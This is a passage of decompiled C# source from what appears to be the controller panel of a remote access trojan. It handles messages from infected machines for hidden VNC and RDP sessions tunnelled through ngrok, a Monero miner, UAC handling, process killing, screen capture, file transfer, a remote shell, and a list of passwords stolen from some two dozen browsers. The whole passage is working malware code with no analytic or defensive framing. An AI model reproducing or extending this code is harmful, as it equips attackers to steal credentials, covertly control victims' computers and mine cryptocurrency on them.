					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				VDP vDP = (VDP)smethod_7("VDP" + client.ip());
				switch (array[2])
				{
				case "VERR":
					try
					{
						Interaction.MsgBox(array[3], MsgBoxStyle.Exclamation, "Error");
						break;
					}
					catch (Exception projectError52)
					{
						ProjectData.SetProjectError(projectError52);
						ProjectData.ClearProjectError();
						break;
					}
				case "Start":
					try
					{
						string expression13 = array[3];
						string[] array39 = Strings.Split(expression13, "|'|");
						vDP.n.Text = array39[0];
						vDP.w.Text = array39[1];
						break;
					}
					catch (Exception projectError51)
					{
						ProjectData.SetProjectError(projectError51);
						ProjectData.ClearProjectError();
						break;
					}
				case "Server":
					if (Operators.CompareString(array[3], "YES", TextCompare: false) != 0)
					{
						vDP.Connect.Text = "Connect";
						vDP.Discon.Text = "Disconnect";
						vDP.Connect.Enabled = true;
						vDP.Discon.Enabled = false;
						vDP.P3.Enabled = false;
						vDP.Log.BackColor = Color.Red;
						vDP.L12.Text = "Not Connect";
					}
					else
					{
						vDP.Connect.Text = "Connected";
						vDP.Connect.Enabled = false;
						vDP.Discon.Enabled = true;
						vDP.P3.Enabled = true;
						vDP.Log.BackColor = Color.ForestGreen;
						vDP.L12.Text = "Connected";
					}
					break;
				case "DD":
					try
					{
						Interaction.MsgBox("Display Resolution : " + array[3], MsgBoxStyle.Information, "Display Resolution Information");
						break;
					}
					catch (Exception projectError53)
					{
						ProjectData.SetProjectError(projectError53);
						ProjectData.ClearProjectError();
						break;
					}
				case "Install":
					if (Operators.CompareString(array[3], "YES", TextCompare: false) != 0)
					{
						vDP.install.Enabled = true;
						vDP.install.Text = "install";
						vDP.Uninstall.Text = "Uninstall";
						vDP.Uninstall.Enabled = false;
						vDP.P2.Enabled = false;
					}
					else
					{
						vDP.install.Text = "installed";
						vDP.install.Enabled = false;
						vDP.Uninstall.Enabled = true;
						vDP.P2.Enabled = true;
					}
					break;
				case "bro":
					try
					{
						if (Operators.CompareString(array[3], "1", TextCompare: false) == 0)
						{
							vDP.Chrome.Enabled = true;
						}
						if (Operators.CompareString(array[3], "2", TextCompare: false) == 0)
						{
							vDP.FOX.Enabled = true;
						}
						if (Operators.CompareString(array[3], "3", TextCompare: false) == 0)
						{
							vDP.EDG.Enabled = true;
						}
						break;
					}
					catch (Exception projectError50)
					{
						ProjectData.SetProjectError(projectError50);
						ProjectData.ClearProjectError();
						break;
					}
				case "~":
					if (vDP == null)
					{
						VDP vDP2 = new VDP();
						vDP2.C = client;
						vDP2.Name = "VDP" + client.ip();
						vDP2.Show();
					}
					break;
				case "Por":
					try
					{
						string expression12 = array[3];
						string[] array38 = Strings.Split(expression12, "|-|");
						vDP.Ports = array38[1];
						break;
					}
					catch (Exception projectError49)
					{
						ProjectData.SetProjectError(projectError49);
						ProjectData.ClearProjectError();
						break;
					}
				}
				return;
			}
			case "uac":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex25)
					{
						ProjectData.SetProjectError(ex25);
						Exception ex26 = ex25;
						ProjectData.SetProjectError(ex26);
						Exception projectError39 = ex26;
						ProjectData.SetProjectError(projectError39);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				uac uac = (uac)smethod_7("uac" + client.ip());
				switch (array[2])
				{
				case "~":
					if (uac == null)
					{
						uac uac2 = new uac();
						uac2.C = client;
						uac2.Name = "uac" + client.ip();
						uac2.Show();
					}
					break;
				case "Start":
					try
					{
						string expression9 = array[3];
						string[] array32 = Strings.Split(expression9, "|'|");
						uac.n.Text = array32[0];
						uac.w.Text = array32[1];
						uac.Admin = array32[2];
						break;
					}
					catch (Exception projectError40)
					{
						ProjectData.SetProjectError(projectError40);
						ProjectData.ClearProjectError();
						break;
					}
				case "Past":
					break;
				}
				return;
			}
			case "RDP":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex18)
					{
						ProjectData.SetProjectError(ex18);
						Exception ex19 = ex18;
						ProjectData.SetProjectError(ex19);
						Exception projectError29 = ex19;
						ProjectData.SetProjectError(projectError29);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				RDP rDP = (RDP)smethod_7("RDP" + client.ip());
				switch (array[2])
				{
				case "uns":
					if (Operators.CompareString(array[3], "YES", TextCompare: false) != 0)
					{
						try
						{
							rDP.UNS.Text = array[3];
							rDP.UNS.Enabled = true;
							break;
						}
						catch (Exception projectError30)
						{
							ProjectData.SetProjectError(projectError30);
							ProjectData.ClearProjectError();
							break;
						}
					}
					rDP.UNS.Text = "Unstall";
					rDP.UNS.Enabled = false;
					break;
				case "ngrok":
					if (Operators.CompareString(array[3], "Yes", TextCompare: false) == 0)
					{
						rDP.bngrok.Text = "Disconnect";
						rDP.key_ngrok.Enabled = false;
						rDP.bngrok.Enabled = true;
					}
					if (Operators.CompareString(array[3], "No", TextCompare: false) == 0)
					{
						rDP.bngrok.Text = "Connect";
						rDP.key_ngrok.Enabled = true;
						rDP.bngrok.Enabled = true;
					}
					if (Operators.CompareString(array[3], "Not", TextCompare: false) == 0)
					{
						rDP.key_ngrok.Enabled = true;
						rDP.bngrok.Text = "The connection could";
						rDP.bngrok.Enabled = true;
					}
					break;
				case "ins":
					try
					{
						if (Operators.CompareString(array[3], "NOT", TextCompare: false) == 0)
						{
							rDP.bngrok.Text = "The connection could";
						}
						rDP.install.Text = array[3];
						if (Operators.CompareString(array[3], "installed", TextCompare: false) == 0)
						{
							rDP.install.Enabled = false;
							rDP.UNS.Enabled = true;
						}
						if (Operators.CompareString(array[3], "install", TextCompare: false) == 0)
						{
							rDP.install.Enabled = true;
							rDP.UNS.Enabled = false;
						}
						if (Operators.CompareString(array[3], "Error", TextCompare: false) == 0)
						{
							rDP.install.Enabled = true;
							rDP.UNS.Enabled = false;
							Interaction.MsgBox("Error");
						}
						break;
					}
					catch (Exception projectError33)
					{
						ProjectData.SetProjectError(projectError33);
						ProjectData.ClearProjectError();
						break;
					}
				case "Ac":
					try
					{
						ListViewItem listViewItem7 = new ListViewItem();
						listViewItem7.Text = rDP.SUser.Text;
						listViewItem7.SubItems.Add(rDP.Spassword.Text);
						listViewItem7.ImageIndex = 0;
						rDP.L1.Items.Add(listViewItem7);
						rDP.SUser.Text = "";
						rDP.Spassword.Text = "";
						rDP.CRR.Enabled = true;
						break;
					}
					catch (Exception projectError32)
					{
						ProjectData.SetProjectError(projectError32);
						ProjectData.ClearProjectError();
						break;
					}
				case "Start":
					try
					{
						string expression7 = array[3];
						string[] array18 = Strings.Split(expression7, "|'|");
						rDP.n.Text = array18[0];
						rDP.w.Text = array18[1];
						rDP.Admin = array18[2];
						break;
					}
					catch (Exception projectError31)
					{
						ProjectData.SetProjectError(projectError31);
						ProjectData.ClearProjectError();
						break;
					}
				case "~":
					if (rDP == null)
					{
						RDP rDP2 = new RDP();
						rDP2.C = client;
						rDP2.Name = "RDP" + client.ip();
						rDP2.Show();
					}
					break;
				}
				return;
			}
			case "vnc":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						ProjectData.SetProjectError(ex12);
						Exception projectError18 = ex12;
						ProjectData.SetProjectError(projectError18);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					vnc vnc = (vnc)smethod_7("vnc" + client.ip());
					switch (array[2])
					{
					case "Start":
						try
						{
							string expression6 = array[3];
							string[] array11 = Strings.Split(expression6, "|'|");
							vnc.n.Text = array11[0];
							vnc.w.Text = array11[1];
							vnc.Admin = array11[2];
							break;
						}
						catch (Exception projectError19)
						{
							ProjectData.SetProjectError(projectError19);
							ProjectData.ClearProjectError();
							break;
						}
					case "ngrok":
						try
						{
							if (Operators.CompareString(array[3], "No", TextCompare: false) != 0)
							{
								vnc.bngrok.Text = "Disconnect";
								vnc.key_ngrok.Enabled = false;
								vnc.bngrok.FillColor = Color.LimeGreen;
								vnc.bngrok.FillColor2 = Color.LimeGreen;
							}
							else
							{
								vnc.bngrok.Text = "The connection could";
								vnc.key_ngrok.Enabled = true;
							}
							break;
						}
						catch (Exception projectError22)
						{
							ProjectData.SetProjectError(projectError22);
							ProjectData.ClearProjectError();
							break;
						}
					case "ins":
						try
						{
							if (Operators.CompareString(array[3], "Yes", TextCompare: false) == 0)
							{
								vnc.install.Text = "installed";
								vnc.install.Enabled = false;
							}
							if (Operators.CompareString(array[3], "No", TextCompare: false) == 0)
							{
								vnc.install.Text = "install";
								vnc.install.Enabled = true;
							}
							break;
						}
						catch (Exception projectError21)
						{
							ProjectData.SetProjectError(projectError21);
							ProjectData.ClearProjectError();
							break;
						}
					case "startvnc":
						try
						{
							vnc.Start.Text = "Is runnig";
							break;
						}
						catch (Exception projectError20)
						{
							ProjectData.SetProjectError(projectError20);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (vnc == null)
						{
							vnc vnc2 = new vnc();
							vnc2.C = client;
							vnc2.Name = "vnc" + client.ip();
							vnc2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "XMR":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.SetProjectError(ex4);
						Exception projectError8 = ex4;
						ProjectData.SetProjectError(projectError8);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					XMR xMR = (XMR)smethod_7("XMR" + client.ip());
					switch (array[2])
					{
					case "Start":
						try
						{
							string expression2 = array[3];
							string[] array4 = Strings.Split(expression2, "|'|");
							xMR.n.Text = array4[0];
							xMR.w.Text = array4[1];
							break;
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
							break;
						}
					case "X":
						try
						{
							if (Operators.CompareString(array[3], "Yes", TextCompare: false) == 0)
							{
								xMR.bngrok.Enabled = true;
								xMR.bngrok.Text = "Doni";
								Interaction.MsgBox("Completed", MsgBoxStyle.Information, "Is runnig");
								xMR.cc();
							}
							if (Operators.CompareString(array[3], "No", TextCompare: false) == 0)
							{
								new XMR();
								xMR.bngrok.Enabled = true;
								xMR.bngrok.Text = "Error";
								Interaction.MsgBox("The connection could", MsgBoxStyle.Exclamation, "Package installation error");
								xMR.cc();
							}
							break;
						}
						catch (Exception projectError10)
						{
							ProjectData.SetProjectError(projectError10);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (xMR == null)
						{
							XMR xMR2 = new XMR();
							xMR2.C = client;
							xMR2.Name = "XMR" + client.ip();
							xMR2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "coc":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex66)
					{
						ProjectData.SetProjectError(ex66);
						Exception ex67 = ex66;
						ProjectData.SetProjectError(ex67);
						Exception projectError92 = ex67;
						ProjectData.SetProjectError(projectError92);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					congrok congrok = (congrok)smethod_7("coc" + client.ip());
					switch (array[2])
					{
					case "Start":
						try
						{
							string expression27 = array[3];
							string[] array71 = Strings.Split(expression27, "|'|");
							congrok.n.Text = array71[0];
							congrok.w.Text = array71[1];
							break;
						}
						catch (Exception projectError93)
						{
							ProjectData.SetProjectError(projectError93);
							ProjectData.ClearProjectError();
							break;
						}
					case "ngrok":
						try
						{
							if (Operators.CompareString(array[3], "Disconnect", TextCompare: false) == 0)
							{
								congrok.bngrok.Text = "Disconnect";
								congrok.bngrok.Enabled = true;
							}
							else
							{
								congrok.bngrok.Text = "Failed, try again";
								congrok.bngrok.Enabled = true;
							}
							break;
						}
						catch (Exception projectError94)
						{
							ProjectData.SetProjectError(projectError94);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (congrok == null)
						{
							congrok congrok2 = new congrok();
							congrok2.C = client;
							congrok2.Name = "coc" + client.ip();
							congrok2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "Controll":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex58)
					{
						ProjectData.SetProjectError(ex58);
						Exception ex59 = ex58;
						ProjectData.SetProjectError(ex59);
						Exception projectError83 = ex59;
						ProjectData.SetProjectError(projectError83);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					controll controll = (controll)smethod_7("Controll" + client.ip());
					string left14 = array[2];
					if (Operators.CompareString(left14, "~", TextCompare: false) == 0)
					{
						if (controll == null)
						{
							controll controll2 = new controll();
							controll2.C = client;
							controll2.Name = "Controll" + client.ip();
							controll2.Show();
						}
					}
					else if (Operators.CompareString(left14, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression25 = array[3];
							string[] array62 = Strings.Split(expression25, "|'|");
							controll.n.Text = array62[0];
							controll.w.Text = array62[1];
							controll.Admin = array62[2];
							return;
						}
						catch (Exception projectError84)
						{
							ProjectData.SetProjectError(projectError84);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "uns":
			{
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex43)
					{
						ProjectData.SetProjectError(ex43);
						Exception ex44 = ex43;
						ProjectData.SetProjectError(ex44);
						Exception projectError66 = ex44;
						ProjectData.SetProjectError(projectError66);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (((Control)object_1).InvokeRequired)
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
					return;
				}
				Uns uns = (Uns)smethod_7("uns" + client.ip());
				string left8 = array[2];
				if (Operators.CompareString(left8, "~", TextCompare: false) != 0)
				{
					if (Operators.CompareString(left8, "Start", TextCompare: false) == 0)
					{
						try
						{
							string expression17 = array[3];
							string[] array48 = Strings.Split(expression17, "|'|");
							uns.n.Text = array48[0];
							uns.w.Text = array48[1];
							uns.Admin = array48[2];
							return;
						}
						catch (Exception projectError67)
						{
							ProjectData.SetProjectError(projectError67);
							ProjectData.ClearProjectError();
							return;
						}
					}
				}
				else if (uns == null)
				{
					Uns uns2 = new Uns();
					uns2.C = client;
					uns2.Name = "uns" + client.ip();
					uns2.Show();
				}
				return;
			}
			case "Anti":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex37)
					{
						ProjectData.SetProjectError(ex37);
						Exception ex38 = ex37;
						ProjectData.SetProjectError(ex38);
						Exception projectError57 = ex38;
						ProjectData.SetProjectError(projectError57);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					AntiProcess antiProcess = (AntiProcess)smethod_7("Anti" + client.ip());
					switch (array[2])
					{
					case "Proc":
						try
						{
							antiProcess.L1.Items.Clear();
							string[] array42 = Strings.Split(array[3], "\r\n");
							string[] array43 = array42;
							foreach (string text22 in array43)
							{
								if (Operators.CompareString(text22, "N/A%|%", TextCompare: false) != 0)
								{
									string[] array44 = Strings.Split(text22, "%|%");
									ListViewItem listViewItem14 = new ListViewItem();
									listViewItem14.Text = array44[0];
									listViewItem14.ImageIndex = 0;
									antiProcess.L1.Items.Add(listViewItem14);
								}
							}
							break;
						}
						catch (Exception projectError58)
						{
							ProjectData.SetProjectError(projectError58);
							ProjectData.ClearProjectError();
							break;
						}
					case "Start":
						try
						{
							string expression15 = array[3];
							string[] array45 = Strings.Split(expression15, "|'|");
							antiProcess.n.Text = array45[0];
							antiProcess.w.Text = array45[1];
							break;
						}
						catch (Exception projectError59)
						{
							ProjectData.SetProjectError(projectError59);
							ProjectData.ClearProjectError();
							break;
						}
					case "~":
						if (antiProcess == null)
						{
							AntiProcess antiProcess2 = new AntiProcess();
							antiProcess2.C = client;
							antiProcess2.Name = "Anti" + client.ip();
							antiProcess2.Show();
						}
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "pw":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex31)
					{
						ProjectData.SetProjectError(ex31);
						Exception ex32 = ex31;
						ProjectData.SetProjectError(ex32);
						Exception projectError47 = ex32;
						ProjectData.SetProjectError(projectError47);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					Pass pass = (Pass)smethod_7("pw" + client.ip());
					switch (array[2])
					{
					case "~":
						if (pass == null)
						{
							Pass pass2 = new Pass();
							pass2.c = client;
							pass2.Name = "pw" + client.ip();
							pass2.Show();
						}
						break;
					case "DONI":
					{
						ListViewItem listViewItem12 = new ListViewItem();
						listViewItem12.Text = array[3];
						listViewItem12.SubItems.Add(array[4]);
						listViewItem12.SubItems.Add(array[5]);
						listViewItem12.SubItems.Add(array[6]);
						if (!listViewItem12.Text.EndsWith("Chrome"))
						{
							if (listViewItem12.Text.EndsWith("Opera"))
							{
								listViewItem12.ImageIndex = 1;
							}
							else if (!listViewItem12.Text.EndsWith("Yandex"))
							{
								if (listViewItem12.Text.EndsWith("360 Browser"))
								{
									listViewItem12.ImageIndex = 3;
								}
								else if (!listViewItem12.Text.EndsWith("Comodo Dragon"))
								{
									if (!listViewItem12.Text.EndsWith("CoolNovo"))
									{
										if (!listViewItem12.Text.EndsWith("SRWare Iron"))
										{
											if (listViewItem12.Text.EndsWith("Torch Browser"))
											{
												listViewItem12.ImageIndex = 7;
											}
											else if (listViewItem12.Text.EndsWith("Brave Browser"))
											{
												listViewItem12.ImageIndex = 8;
											}
											else if (listViewItem12.Text.EndsWith("Iridium Browser"))
											{
												listViewItem12.ImageIndex = 9;
											}
											else if (!listViewItem12.Text.EndsWith("7Star"))
											{
												if (listViewItem12.Text.EndsWith("Amigo"))
												{
													listViewItem12.ImageIndex = 11;
												}
												else if (listViewItem12.Text.EndsWith("CentBrowser"))
												{
													listViewItem12.ImageIndex = 12;
												}
												else if (!listViewItem12.Text.EndsWith("Chedot"))
												{
													if (!listViewItem12.Text.EndsWith("CocCoc"))
													{
														if (listViewItem12.Text.EndsWith("Elements Browser"))
														{
															listViewItem12.ImageIndex = 15;
														}
														else if (listViewItem12.Text.EndsWith("Epic Privacy Browser"))
														{
															listViewItem12.ImageIndex = 16;
														}
														else if (listViewItem12.Text.EndsWith("Kometa"))
														{
															listViewItem12.ImageIndex = 17;
														}
														else if (!listViewItem12.Text.EndsWith("Orbitum"))
														{
															if (!listViewItem12.Text.EndsWith("Sputnik"))
															{
																if (listViewItem12.Text.EndsWith("Vivaldi"))
																{
																	listViewItem12.ImageIndex = 20;
																}
																else if (listViewItem12.Text.EndsWith("Coowon"))
																{
																	listViewItem12.ImageIndex = 21;
																}
																else if (!listViewItem12.Text.EndsWith("Liebao Browser"))
																{
																	if (listViewItem12.Text.EndsWith("Edge Chromium"))
																	{
																		listViewItem12.ImageIndex = 23;
																	}
																	else
																	{
																		listViewItem12.ImageIndex = 24;
																	}
																}
																else
																{
																	listViewItem12.ImageIndex = 22;
																}
															}
															else
															{
																listViewItem12.ImageIndex = 19;
															}
														}
														else
														{
															listViewItem12.ImageIndex = 18;
														}
													}
													else
													{
														listViewItem12.ImageIndex = 14;
													}
												}
												else
												{
													listViewItem12.ImageIndex = 13;
												}
											}
											else
											{
												listViewItem12.ImageIndex = 10;
											}
										}
										else
										{
											listViewItem12.ImageIndex = 6;
										}
									}
									else
									{
										listViewItem12.ImageIndex = 5;
									}
								}
								else
								{
									listViewItem12.ImageIndex = 4;
								}
							}
							else
							{
								listViewItem12.ImageIndex = 2;
							}
						}
						else
						{
							listViewItem12.ImageIndex = 0;
						}
						pass.L1.Items.Add(listViewItem12);
						break;
					}
					case "Start":
						pass.SS = array[3];
						break;
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_5))) });
				}
				return;
			case "sc~":
				if (client.osk == null)
				{
					client.isPL = true;
					try
					{
						client.osk = sk_0.GetClient(array[1]);
					}
					catch (Exception ex24)
					{
						ProjectData.SetProjectError(ex24);
						Exception projectError38 = ex24;
						ProjectData.SetProjectError(projectError38);
						client.CN = false;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				if (!((Control)object_1).InvokeRequired)
				{
					if ((sc)smethod_7("sc" + client.ip()) == null)
					{
						sc sc3 = new sc();
						sc3.osk = client.osk;
						sc3.sz = new Size(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
						sc3.p.Image = null;
						sc3.Oimg = new Bitmap(sc3.sz.Width, sc3.sz.Height, PixelFormat.Format32bppPArgb);
						sc3.sk = client;
						sc3.Name = "sc" + client.ip();
						sc3.Show();
					}
				}
				else
				{
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
				}
				return;
			case "rss":
			{
				Manager manager5 = (Manager)smethod_7("m" + client.ip());
				if (manager5 != null)
				{
					manager5.shStarted = 2;
					manager5.T2.ReadOnly = false;
					manager5.T2.BackColor = Color.Black;
				}
				return;
			}
			case "post":
				client.osk = sk_0.GetClient(array[3]);
				try
				{
					client.t.Dispose();
					client.CN = false;
					client.NoPing = true;
					object objectValue = RuntimeHelpers.GetObjectValue(object_5);
					object[] array20 = new object[2] { 1, null };
					object[] array21 = array20;
					string text12 = "post+" + string_1 + array[1] + string_1 + array[2] + string_1 + array[3];
					byte[] array22 = Class6.smethod_3(ref text12);
					array21[1] = array22;
					object[] arguments = array20;
					object obj = null;
					NewLateBinding.LateIndexSet(RuntimeHelpers.GetObjectValue(objectValue), arguments, (string[])obj);
					((Control)object_1).Invoke((Delegate)new Delegate0(smethod_9), new object[1] { RuntimeHelpers.GetObjectValue(object_5) });
					int num8 = 0;
					while (smethod_7(array[3] + array[1]) == null)
					{
						num8++;
						if (num8 != 1000)
						{
							Thread.Sleep(10);
							continue;
						}
						return;
					}
					Socket client2 = client.Client.Client;
					text12 = "ok";
					byte[] buffer = Class6.smethod_3(ref text12);
					client2.Send(buffer, 0, 2, SocketFlags.None);
					client.Client.Client.ReceiveBufferSize = 1048576;
					long_0 += 2L;
					DW dW = (DW)smethod_7(array[3] + array[1]);
					int num9 = 0;
					try
					{
						while (true)
						{
							byte[] array23 = new byte[1048577];
							client.Client.Client.Poll(-1, SelectMode.SelectRead);
							int num10 = client.Client.Client.Receive(array23, 0, array23.Length, SocketFlags.None);
							dW.FS.Write(array23, 0, num10);
							long_1 += num10;
							num9 += num10;
							dW.ProgressBar1.Value += num10;
							dW.FS.Flush();
							if (num9 == dW.SZ)
							{
								break;
							}
							Thread.Sleep(1);
						}
						dW.Button1.Enabled = false;
						dW.FS.Close();
						dW.FS.Dispose();
						if (File.Exists(dW.folder))
						{
							File.Delete(dW.folder);
						}
						File.Move(dW.tmp, dW.folder);
						dW.Close();
					}
					catch (Exception ex22)
					{
						ProjectData.SetProjectError(ex22);
						Exception projectError36 = ex22;
						ProjectData.SetProjectError(projectError36);
						dW.Text = "connection lost";
						dW.ForeColor = Color.Red;
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex23)
				{
					ProjectData.SetProjectError(ex23);
					Exception projectError37 = ex23;
					ProjectData.SetProjectError(projectError37);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				client.Close();
				return;
			case "get":
			{
				client.isPL = true;
				client.t.Dispose();
				client.CN = false;
				client.NoPing = true;
				up up = (up)smethod_7(array[1] + array[2]);
				if (up == null)
				{
					client.Close();
					return;
				}
				up.sk = client;
				int num6 = 0;
				client.Client.SendBufferSize = 524288;
				try
				{
					while (true)
					{
						if (num6 != up.SZ)
						{
							if (!up.Closinge)
							{
								byte[] array16 = new byte[10241];
								int num7 = up.FS.Read(array16, 0, array16.Length);
								client.Client.Client.Poll(-1, SelectMode.SelectWrite);
								client.Client.Client.Send(array16, 0, num7, SocketFlags.None);
								num6 += num7;
								long_0 += num7;
								up.ProgressBar1.Value += num7;
								continue;
							}
							break;
						}
						up.Close();
						break;
					}
				}
				catch (Exception ex16)
				{
					ProjectData.SetProjectError(ex16);
					Exception projectError27 = ex16;
					ProjectData.SetProjectError(projectError27);
					try
					{
						up.Text = "Connection lost";
						up.D.ForeColor = Color.Red;
					}
					catch (Exception ex17)
					{
						ProjectData.SetProjectError(ex17);
						Exception projectError28 = ex17;
						ProjectData.SetProjectError(projectError28);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				client.Close();
				return;
			}
			case "srv":
			{
				Manager manager3 = (Manager)smethod_7("m" + client.ip());
				if (manager3 == null || Operators.CompareString(array[1], "~", TextCompare: false) != 0)
				{
					return;
				}
				List<string> list = new List<string>();
				List<ListViewItem> list2 = new List<ListViewItem>();
				int num = array.Length - 1;
				for (int i = 2; i <= num; i++)
				{
					string[] array3 = Strings.Split(array[i], "[,]");
					list.Add(array3[0].ToLower());
					if (!manager3.LSRV.Items.ContainsKey(array3[0]))
					{
						ListViewItem listViewItem2 = new ListViewItem(array3[0]);
						int num2 = array3.Length - 1;
						for (int j = 1; j <= num2; j++)
						{
							listViewItem2.SubItems.Add(array3[j]);
						}
						if (Conversions.ToBoolean(array3[4]))
						{
							listViewItem2.ImageIndex = 1;
						}
						else
						{
							listViewItem2.ImageIndex = 0;
						}
						listViewItem2.Name = array3[0];
						list2.Add(listViewItem2);
						if (list2.Count > 20)
						{
							manager3.LSRV.Items.AddRange(list2.ToArray());
							list2.Clear();
						}
					}
					else
					{
						ListViewItem listViewItem3 = manager3.LSRV.Items[array3[0]];
						listViewItem3.SubItems[3].Text = array3[3];
						listViewItem3.SubItems[4].Text = array3[4];
					}
				}
				if (list2.Count > 0)
				{
					manager3.LSRV.Items.AddRange(list2.ToArray());
					list2.Clear();
				}
				List<string> list3 = new List<string>();
				try
				{
					foreach (ListViewItem item5 in manager3.LSRV.Items)
					{
						if (!list.Contains(item5.Text.ToLower()))
						{
							list3.Add(item5.Text);
						}
					}
				}
				finally
				{
					IEnumerator enumerator2 = default(IEnumerator);
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
				List<string>.Enumerator enumerator3 = default(List<string>.Enumerator);
				try
				{
					enumerator3 = list3.GetEnumerator();
					while (enumerator3.MoveNext())
					{
						string current = enumerator3.Current;
						manager3.LSRV.Items.RemoveByKey(current);
					}
				}
				finally
				{
					enumerator3.Dispose();
				}
				manager3.srvNxt = true;
				if (manager3.SrvFX)
				{
					manager3.SrvFX = false;
					manager3.LSRV.method_3();
				}
				return;
			}
			case "INF":
			{
				Manager manager2 = (Manager)smethod_7("m" + client.ip());
				if (manager2 != null)
				{
					manager2.FI.Items.Clear();
					manager2.FI.Items.Add("User Name").SubItems.Add(array[1]);
